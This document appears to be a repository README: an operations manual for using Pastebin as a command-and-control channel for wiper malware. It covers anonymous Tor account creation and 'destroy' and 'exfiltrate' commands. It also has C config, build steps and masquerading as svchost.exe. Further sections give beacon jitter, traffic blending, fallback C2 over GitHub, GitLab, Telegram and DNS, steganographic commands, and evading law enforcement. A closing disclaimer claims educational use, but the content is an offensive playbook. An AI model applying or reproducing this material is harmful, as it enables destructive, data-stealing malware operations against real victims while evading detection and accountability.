# Pastebin-C2 Server

# Complete Pastebin C2 Operations Manual

## 🎯 Overview of Pastebin C2 Integration

Pastebin serves as a **free, anonymous Command & Control (C2) channel** that's difficult to trace and block. Here's how to properly utilize it:

---

## 📋 Table of Contents
1. [Pastebin Account Setup](#1-pastebin-account-setup)
2. [C2 Communication Protocol](#2-c2-communication-protocol)
3. [Operational Security](#3-operational-security)
4. [Advanced Techniques](#4-advanced-techniques)
5. [Troubleshooting](#5-troubleshooting)
6. [Alternative Services](#6-alternative-services)

---

## 1. PASTEBIN ACCOUNT SETUP

### Step 1: Anonymous Account Creation
```bash
# Required: Use Tor Browser or VPN
# 1. Open Tor Browser
# 2. Navigate to pastebin.com
# 3. Click "Sign Up"
```

#### Account Details (Use fake information):
- **Username**: Random (e.g., "user4839472")
- **Email**: Use temporary email service
  - temp-mail.org
  - guerrillamail.com
  - 10minutemail.com
- **Password**: Strong, unique password
- **CAPTCHA**: Solve through Tor

### Step 2: Account Configuration
```ini
# Paste Settings:
Paste Exposure: Unlisted
Paste Expiration: Never
Folder: (Create new folder "config")
Format: None (Plain Text)
```

### Step 3: Browser Fingerprint Protection
- **Disable JavaScript** in Tor Browser
- **Use consistent identity** for all operations
- **Clear cookies** after each session
- **Never login from clearnet**

---

## 2. C2 COMMUNICATION PROTOCOL

### Basic Command Structure
```json
{
    "command": "destroy",
    "timestamp": "2024-01-15T14:30:00Z",
    "signature": "a1b2c3d4e5f6...",
    "id": "host_123456"
}
```

### Step 1: Create Command Paste
**Paste Content** (for destruction command):
```json
destroy
```
Or for more complex commands:
```json
{
    "action": "exfiltrate",
    "target": "documents",
    "priority": "high"
}
```

### Step 2: Get Raw URL
1. Create new paste with command
2. Click "Create New Paste"
3. Click "raw" button or use format:
   ```
   https://pastebin.com/raw/PASTE_ID
   ```

### Step 3: Update Malware Configuration
Edit `src/config.h`:
```c
#define C2_SERVER1 "https://pastebin.com/raw/ABCD1234"
#define C2_SERVER2 "https://pastebin.com/raw/EFGH5678"
#define C2_SERVER3 "https://pastebin.com/raw/IJKL9012"
```

### Step 4: Rebuild and Deploy
```batch
# Rebuild with new C2 servers
build.bat

# Deploy updated malware
copy wiper_stealth.exe E:\svchost.exe
```

---

## 3. OPERATIONAL SECURITY

### OpSec Procedures

#### 1. Account Rotation
```bash
# Rotate accounts every 30 days
# Use 3+ accounts simultaneously
Account1: Primary commands
Account2: Backup commands  
Account3: Decoy/confusion
```

#### 2. Communication Schedule
```python
# Malware beacon timing (randomized)
beacon_schedule = {
    "primary": "08:00-18:00 Mon-Fri",
    "backup": "Random 2-hour windows",
    "emergency": "Any time"
}
```

#### 3. Traffic Blending
```c
// Mimic legitimate software updates
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define REFERRER "https://www.microsoft.com/en-us/"
```

### Anti-Detection Measures

#### 1. Request Pattern Obfuscation
```python
# Don't check too frequently
MIN_CHECK_INTERVAL = 300  # 5 minutes
MAX_CHECK_INTERVAL = 1800 # 30 minutes

# Add random jitter
JITTER_PERCENT = 40
```

#### 2. Error Handling
```c
// Handle rate limiting gracefully
if (http_status == 429) { // Too Many Requests
    Sleep(3600000); // Wait 1 hour
    return FALSE;
}
```

#### 3. Fallback Mechanisms
```c
// Multiple C2 channels
const char* C2_SERVERS[] = {
    "https://pastebin.com/raw/PRIMARY",
    "https://github.com/user/repo/raw/main/trigger.txt",
    "https://gitlab.com/user/repo/raw/main/commands.txt",
    NULL
};
```

---

## 4. ADVANCED TECHNIQUES

### Encrypted Commands

#### Step 1: Generate Encryption Key
```python
# Python script to generate encrypted commands
from cryptography.fernet import Fernet
import base64

key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt command
command = "destroy"
encrypted = cipher.encrypt(command.encode())
print(base64.urlsafe_b64encode(encrypted).decode())
```

#### Step 2: Post Encrypted Command
**Paste Content** (encrypted):
```
gAAAAABf0x_7w3V2ZQ4OX7F6q5z3nJpYk1LmN8tR9vE6bCdAqPsT1rS2wXy5vM8KjHlB4oD3nZ
```

#### Step 3: Malware Decryption
```c
// In malware C2 client
BOOL DecryptCommand(const char* encrypted, char* output) {
    // Implementation of Fernet decryption
    // Use pre-shared key
    return TRUE;
}
```

### Steganography Techniques

#### Method 1: Comment Embedding
```html
<!-- Normal-looking HTML page -->
<html>
<head><title>Software Update</title></head>
<body>
    <h1>Windows Update Service</h1>
    <p>Latest security patches available.</p>
    <!-- COMMAND: destroy -->
</body>
</html>
```

#### Method 2: Whitespace Encoding
```python
# Encode command in whitespace
def encode_whitespace(command):
    binary = ''.join(format(ord(c), '08b') for c in command)
    # Convert 0=space, 1=tab
    return binary.replace('0', ' ').replace('1', '\t')
```

### Multi-Layer C2 Architecture

#### Layer 1: Pastebin (Primary)
```
https://pastebin.com/raw/PRIMARY_ID
```

#### Layer 2: GitHub (Secondary)
```
https://github.com/user/repo/raw/main/trigger.txt
```

#### Layer 3: Custom Domain (Tertiary)
```
https://legitimate-looking-domain.com/update.json
```

#### Layer 4: DNS (Fallback)
```
command.legitimate-domain.com TXT record
```

---

## 5. TROUBLESHOOTING

### Common Issues & Solutions

#### Issue: Pastebin Blocking Requests
**Symptoms**: 403 errors, CAPTCHA requirements
**Solutions**:
```c
// Implement rotating User-Agents
const char* USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    NULL
};
```

#### Issue: Rate Limiting
**Symptoms**: 429 Too Many Requests
**Solutions**:
```c
// Exponential backoff
DWORD CalculateBackoff(int attempt) {
    DWORD base = 60000; // 1 minute
    return base * (1 << (attempt - 1)); // Exponential
}
```

#### Issue: Account Banned
**Symptoms**: Login failures, paste deletion
**Solutions**:
1. **Use new Tor circuit**
2. **Create new account** with different credentials
3. **Switch to backup C2 channel**
4. **Implement dead drop activation**

### Debugging C2 Communication

#### Enable Verbose Logging
```c
#define DEBUG_C2 1

#ifdef DEBUG_C2
#define C2_DEBUG(msg) LogToFile(msg)
#else
#define C2_DEBUG(msg)
#endif
```

#### Check Network Connectivity
```batch
# Test C2 connectivity from target
curl -A "Mozilla/5.0" https://pastebin.com/raw/TEST_ID

# Check DNS resolution
nslookup pastebin.com

# Verify Tor connectivity (if using)
curl --socks5-hostname 127.0.0.1:9050 http://check.torproject.org
```

#### Monitor Malware Activity
```batch
# Check if malware is beaconing
netstat -an | findstr "ESTABLISHED"

# Monitor process network activity
tcpview.exe

# Check malware logs
type C:\Windows\Temp\system_log.txt
```

---

## 6. ALTERNATIVE SERVICES

### Primary Alternatives to Pastebin

#### 1. GitHub Gists
```bash
# Advantages: Legitimate traffic, high availability
# Usage: https://gist.githubusercontent.com/user/GIST_ID/raw

# Create gist:
curl -X POST -H "Authorization: token GITHUB_TOKEN" \
  -d '{"public":false,"files":{"command.txt":{"content":"destroy"}}}' \
  https://api.github.com/gists
```

#### 2. GitLab Snippets
```bash
# Advantages: Less monitored, flexible
# Usage: https://gitlab.com/snippets/SNIPPET_ID/raw

# Create snippet via API
curl -X POST -H "PRIVATE-TOKEN: YOUR_TOKEN" \
  -d "title=Update&file_name=command.txt&content=destroy&visibility=private" \
  https://gitlab.com/api/v4/snippets
```

#### 3. Telegram Bots
```python
# More resilient, encrypted
import telegram
bot = telegram.Bot(token='BOT_TOKEN')
updates = bot.get_updates()
command = updates[0].message.text
```

#### 4. DNS-based C2
```bash
# Very stealthy, hard to block
# Use TXT records for commands
nslookup -type=TXT command.your-domain.com
```

### Service Comparison Table

| Service | Pros | Cons | Recommended Use |
|---------|------|------|-----------------|
| **Pastebin** | Free, anonymous, high uptime | Rate limiting, monitoring | Primary C2 |
| **GitHub Gists** | Legitimate traffic, API access | Account required, logging | Secondary C2 |
| **GitLab Snippets** | Less monitored, private | Smaller user base | Backup C2 |
| **Telegram** | Encrypted, mobile access | Phone number required | Emergency C2 |
| **DNS** | Very stealthy, hard to block | Complex setup | Fallback C2 |

---

## 🛡️ SECURITY PROTOCOLS

### Operational Security Checklist

#### Pre-Operation
- [ ] Use Tor Browser for all account creation
- [ ] Verify no IP leaks (ipleak.net)
- [ ] Use temporary email addresses
- [ ] Create multiple backup accounts
- [ ] Test C2 connectivity from isolated environment

#### During Operation
- [ ] Rotate accounts regularly (every 30 days)
- [ ] Use encrypted commands when possible
- [ ] Monitor for account suspension
- [ ] Maintain multiple active C2 channels
- [ ] Keep operational tempo realistic

#### Post-Operation
- [ ] Delete all command pastes
- [ ] Close temporary email accounts
- [ ] Clear browser history and cookies
- [ ] Document lessons learned
- [ ] Prepare new infrastructure for next operation

### Incident Response

#### If Compromised:
1. **Immediately** cease all C2 communication
2. **Activate** self-destruct on deployed malware
3. **Abandon** all associated accounts
4. **Analyze** detection method
5. **Rebuild** infrastructure from scratch

#### Compromise Indicators:
- Account login from unfamiliar locations
- Unexpected password reset emails
- Pastes modified or deleted unexpectedly
- Unusual traffic patterns from malware
- Security vendor detection reports

---

## 🎯 QUICK START RECIPE

### 5-Minute Pastebin C2 Setup

#### Step 1: Account Creation (2 minutes)
```bash
1. Open Tor Browser
2. Go to temp-mail.org for email
3. Sign up at pastebin.com with temp email
4. Verify email (if required)
```

#### Step 2: Command Paste (1 minute)
```bash
1. Create new paste with content: "destroy"
2. Set to Unlisted, Never expire
3. Copy raw URL
```

#### Step 3: Malware Configuration (1 minute)
```c
// Edit config.h
#define C2_SERVER1 "https://pastebin.com/raw/YOUR_PASTE_ID"
```

#### Step 4: Build & Test (1 minute)
```batch
build.bat
wiper.exe --test-c2
```

### Maintenance Schedule

#### Daily:
- Check account status
- Verify paste availability
- Monitor for new detections

#### Weekly:
- Test all C2 channels
- Rotate encryption keys (if used)
- Update operational documentation

#### Monthly:
- Create new accounts
- Migrate to new infrastructure
- Review security procedures

---

## 🚨 CRITICAL WARNINGS

1. **Pastebin monitors content** - Avoid obvious malware commands
2. **Law enforcement cooperation** - Assume all data is accessible to authorities
3. **Infrastructure persistence** - Don't reuse compromised accounts
4. **Operational timing** - Blend with normal business hours
5. **Cleanup imperative** - Always delete pastes after operations

**This operational guide is for educational and authorized security testing only. Unauthorized use is illegal.**
